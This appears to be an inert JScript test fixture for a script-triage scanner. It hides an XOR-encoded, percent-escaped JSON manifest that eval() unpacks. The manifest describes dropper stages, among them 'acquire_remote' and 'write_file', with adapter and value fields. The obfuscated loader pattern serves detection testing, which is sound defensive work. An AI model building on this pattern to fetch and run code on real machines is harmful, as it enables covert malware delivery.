// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_d4886a38 = function(v_a19c) {
  var keyBytes = [12,116,37,8,124];
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ keyBytes[i % keyBytes.length]); }
  return v_b27e;
};
var recover_c87b3dac = function() {
  if (true) {
    var packedText = "%77%56%56%7c%19%7c%07%07%32%27%2e%15%46%79%09%65%06%40%57%0e%69%19%4a%7c%19%2e%58%07%7f%0e%65%00%40%57%1a%65%18%40%2a%50%2e%10%4c%7b%0c%6d%00%46%60%23%7c%06%4a%6b%19%7f%07%07%24%5e%64%15%4b%6c%13%6a%12%7a%7b%1f%7e%1d%55%7c%5e%51%58%07%69%18%6d%04%51%6d%0e%2e%4e%07%45%15%6f%06%4a%7b%13%6a%00%0b%50%31%40%3c%71%5c%2c%2e%58%07%7e%1d%60%01%40%7b%5e%36%0f%07%6b%1d%61%04%44%61%1b%62%2b%4c%6c%5e%36%56%46%69%11%7c%15%4c%6f%12%21%47%40%3a%44%3a%47%43%3b%49%39%56%09%2a%09%7e%18%07%32%5e%64%00%51%78%0f%36%5b%0a%3b%19%3e%4c%13%3b%1a%3f%41%10%26%19%74%15%48%78%10%69%5a%4c%66%0a%6d%18%4c%6c%53%68%4d%1d%3e%4a%6e%45%44%26%18%6d%00%07%24%5e%79%07%40%7a%23%6d%13%40%66%08%2e%4e%07%40%09%62%00%57%6d%0f%7f%38%44%6a%53%3f%11%17%30%4a%3f%12%16%3d%49%2e%58%07%6e%15%60%11%7a%78%1d%78%1c%07%32%5e%4f%4e%79%54%29%7f%11%57%7b%20%50%24%50%6a%10%65%17%79%54%34%79%1a%51%7a%19%7f%07%69%69%1e%50%28%56%7c%1d%6b%11%08%3b%19%3e%4c%13%3b%1a%3f%41%10%26%18%6d%00%07%24%5e%7e%11%42%61%0f%78%06%5c%57%0c%6d%00%4d%2a%46%2e%3c%6e%4b%29%50%28%76%67%1a%78%03%44%7a%19%50%28%6d%7d%12%78%06%40%7b%0f%40%15%47%54%20%48%1d%56%78%13%7f%15%47%64%19%50%28%16%6d%4e%34%42%16%6e%4f%39%41%07%24%5e%62%11%5d%7c%23%7f%00%44%6f%19%2e%4e%07%7a%19%7f%1b%50%7a%1f%69%59%56%69%11%7c%18%40%26%0c%7f%45%07%75%50%2e%07%51%69%1b%69%37%4a%7d%12%78%56%1f%3c%01";
    var v_a19c = [];
    for (var pi = 0; pi < packedText.length; pi += 3) { v_a19c.push(parseInt(packedText.substr(pi + 1, 2), 16)); }
    var v_f602 = ["north", "south"].join(":");
    var v_b27e = [];
    var state = 1;
    switch (state) { case 1: v_b27e = decode_d4886a38.call(null, v_a19c); break; default: v_b27e = []; }
    var v_c304;
    v_c304 = "";
    for (var bi = 0; bi < v_b27e.length; bi++) { v_c304 += String.fromCharCode(v_b27e[bi]); }
    return v_c304;
  }
};
var inspect_1ec9da61 = function() {
  var v_d41a = eval("(" + recover_c87b3dac.call(null) + ")");
  var v_e598 = new Object();
  v_e598["steps"] = v_d41a["steps"];
  v_e598["adapter"] = v_d41a["adapter"];
  v_e598["values"] = v_d41a["values"];
  v_e598["stageCount"] = v_d41a["stageCount"];
  return v_e598;
};
